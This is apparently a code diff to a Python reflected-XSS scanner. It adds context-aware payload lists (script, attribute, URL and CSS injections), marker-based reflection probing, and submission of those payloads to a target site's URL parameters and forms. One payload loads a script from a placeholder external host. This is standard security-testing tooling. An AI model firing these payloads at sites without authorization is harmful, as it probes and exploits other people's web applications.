@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 import httpx
 import urllib.parse
-from typing import List, Tuple, Dict
+from typing import List, Dict, Set
 import re
+import secrets
 from html.parser import HTMLParser
 
 # Common XSS payloads to test
-XSS_PAYLOADS = [
+BASE_XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
     "<svg/onload=alert('XSS')>",
@@ -23,6 +24,32 @@ XSS_PAYLOADS = [
     "<<SCRIPT>alert('XSS');//<</SCRIPT>",
     "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
 ]
+
+CONTEXTUAL_PAYLOADS = {
+    'html': [
+        "<script>alert('XSS')</script>",
+        "<svg/onload=alert('XSS')>",
+        "<img src=x onerror=alert('XSS')>",
+    ],
+    'attribute': [
+        "\" onmouseover=alert('XSS') x=\"",
+        "' onfocus=alert('XSS') x='",
+        "\" autofocus onfocus=alert('XSS') x=\"",
+    ],
+    'javascript': [
+        "';alert('XSS');//",
+        "\";alert('XSS');//",
+        "</script><script>alert('XSS')</script>",
+    ],
+    'url': [
+        "javascript:alert('XSS')",
+        "data:text/html,<script>alert('XSS')</script>",
+    ],
+    'css': [
+        "</style><script>alert('XSS')</script>",
+        "background-image:url(javascript:alert('XSS'))",
+    ],
+}
 
 class FormParser(HTMLParser):
     """Parse HTML to extract forms and their inputs"""
@@ -70,6 +97,66 @@ def extract_forms(html_content: str) -> List[Dict]:
         log(f'Error parsing HTML forms: {str(e)}', 'DEBUG')
     return parser.forms
 
+def generate_marker() -> str:
+    """Generate a unique marker for reflection testing."""
+    return f"xss{secrets.token_hex(4)}"
+
+def detect_reflection_contexts(response_text: str, marker: str) -> Set[str]:
+    """Detect contexts in which a marker is reflected in the response."""
+    contexts: Set[str] = set()
+    if marker not in response_text:
+        return contexts
+
+    marker_pattern = re.escape(marker)
+    for match in re.finditer(marker_pattern, response_text):
+        start = max(0, match.start() - 150)
+        end = min(len(response_text), match.end() + 150)
+        snippet = response_text[start:end]
+
+        if re.search(r'<script[^>]*>.*?' + marker_pattern, snippet, re.IGNORECASE | re.DOTALL):
+            contexts.add('javascript')
+            continue
+
+        if re.search(r'on\w+\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
+            contexts.add('javascript')
+            continue
+
+        if re.search(r'<[^>]+\s+[^>]*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
+            contexts.add('attribute')
+            continue
+
+        if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
+            contexts.add('url')
+            continue
+
+        if re.search(r'<style[^>]*>.*?' + marker_pattern, snippet, re.IGNORECASE | re.DOTALL):
+            contexts.add('css')
+            continue
+
+        if re.search(r'style\s*=\s*["\'][^"\']*' + marker_pattern, snippet, re.IGNORECASE):
+            contexts.add('css')
+            continue
+
+        contexts.add('html')
+
+    return contexts
+
+def select_payloads_for_contexts(contexts: Set[str]) -> List[str]:
+    """Select payloads based on reflection contexts, with fallback coverage."""
+    payloads = []
+    for context in contexts:
+        payloads.extend(CONTEXTUAL_PAYLOADS.get(context, []))
+
+    if not payloads:
+        payloads = BASE_XSS_PAYLOADS.copy()
+
+    # Ensure base payloads are always included for coverage
+    for payload in BASE_XSS_PAYLOADS:
+        if payload not in payloads:
+            payloads.append(payload)
+
+    return payloads
+
 def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
     """
     Test for reflected XSS vulnerabilities by injecting payloads into URL parameters and forms.
@@ -104,8 +191,28 @@ def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
             # Test GET parameters
             for param_name in params.keys():
                 log(f'Testing XSS on GET parameter: {param_name}', 'INFO')
-                
-                for payload in XSS_PAYLOADS:
+                marker = generate_marker()
+                test_params = params.copy()
+                test_params[param_name] = [marker]
+                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
+
+                try:
+                    response = client.get(base_url, params=flat_params)
+                    contexts = detect_reflection_contexts(response.text, marker)
+                except httpx.TimeoutException:
+                    log(f'Timeout testing {param_name}', 'WARN')
+                    continue
+                except Exception as e:
+                    log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
+                    continue
+
+                if not contexts:
+                    log(f'No reflection detected for {param_name}, skipping payloads', 'DEBUG')
+                    continue
+
+                payloads = select_payloads_for_contexts(contexts)
+
+                for payload in payloads:
                     test_params = params.copy()
                     test_params[param_name] = [payload]
                     flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
@@ -160,7 +267,34 @@ def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
                         field_name = input_field['name']
                         log(f'Testing form input: {field_name}', 'INFO')
                         
-                        for payload in XSS_PAYLOADS:
+                        marker = generate_marker()
+                        probe_data = {}
+                        for inp in form['inputs']:
+                            if inp['name'] == field_name:
+                                probe_data[inp['name']] = marker
+                            else:
+                                probe_data[inp['name']] = inp['value'] or 'test'
+
+                        try:
+                            if form['method'] == 'POST':
+                                probe_response = client.post(form_url, data=probe_data)
+                            else:
+                                probe_response = client.get(form_url, params=probe_data)
+                            contexts = detect_reflection_contexts(probe_response.text, marker)
+                        except httpx.TimeoutException:
+                            log(f'Timeout testing form input {field_name}', 'WARN')
+                            continue
+                        except Exception as e:
+                            log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
+                            continue
+
+                        if not contexts:
+                            log(f'No reflection detected for form input {field_name}, skipping payloads', 'DEBUG')
+                            continue
+
+                        payloads = select_payloads_for_contexts(contexts)
+
+                        for payload in payloads:
                             # Build form data with payload in the tested field
                             form_data = {}
                             for inp in form['inputs']:
@@ -285,44 +419,43 @@ def is_xss_vulnerable(response_text: str, payload: str) -> bool:
     Returns:
         bool: True if potentially vulnerable, False otherwise
     """
-    # Check if payload exists in response unescaped
     if payload not in response_text:
         return False
-    
-    # Look for the payload in dangerous contexts
-    dangerous_contexts = [
-        f'<script>{payload}',  # Direct script injection
-        f'>{payload}<',  # Between tags
-        f'"{payload}"',  # In attribute values
-        f"'{payload}'",  # In single-quoted attributes
-    ]
-    
-    # Check for HTML entity encoding (which would prevent XSS)
-    encoded_chars = ['&lt;', '&gt;', '&quot;', '&#', '&amp;']
-    payload_context_start = response_text.find(payload)
-    
-    if payload_context_start == -1:
+
+    payload_index = response_text.find(payload)
+    if payload_index == -1:
         return False
-    
-    # Check a small window around the payload
-    context_start = max(0, payload_context_start - 20)
-    context_end = min(len(response_text), payload_context_start + len(payload) + 20)
+
+    context_start = max(0, payload_index - 30)
+    context_end = min(len(response_text), payload_index + len(payload) + 30)
     context = response_text[context_start:context_end]
-    
-    # If the payload or its context contains encoded characters, it's likely safe
-    for encoded_char in encoded_chars:
-        if encoded_char in context:
-            return False
-    
-    # Check if payload is in a dangerous context
-    for dangerous_context in dangerous_contexts:
-        if dangerous_context in response_text:
-            return True
-    
-    # If payload contains script tags or event handlers and isn't encoded, likely vulnerable
+
+    encoded_chars = ['&lt;', '&gt;', '&quot;', '&#', '&amp;']
+    if any(char in context for char in encoded_chars) and any(ch in payload for ch in ['<', '>', '"', "'"]):
+        return False
+
+    payload_pattern = re.escape(payload)
+    contexts = set()
+
+    if re.search(r'<script[^>]*>.*?' + payload_pattern, response_text, re.IGNORECASE | re.DOTALL):
+        contexts.add('javascript')
+    if re.search(r'on\w+\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
+        contexts.add('javascript')
+    if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
+        contexts.add('url')
+    if re.search(r'style\s*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
+        contexts.add('css')
+    if re.search(r'<[^>]+\s+[^>]*=\s*["\'][^"\']*' + payload_pattern, response_text, re.IGNORECASE):
+        contexts.add('attribute')
+    if re.search(r'>' + payload_pattern + r'<', response_text):
+        contexts.add('html')
+
+    if contexts:
+        return True
+
     if any(keyword in payload.lower() for keyword in ['<script', 'onerror', 'onload', 'javascript:']):
         return True
-    
+
     return False
 
 def check_xss(url: str, timeout: int = 10) -> List[Dict]:
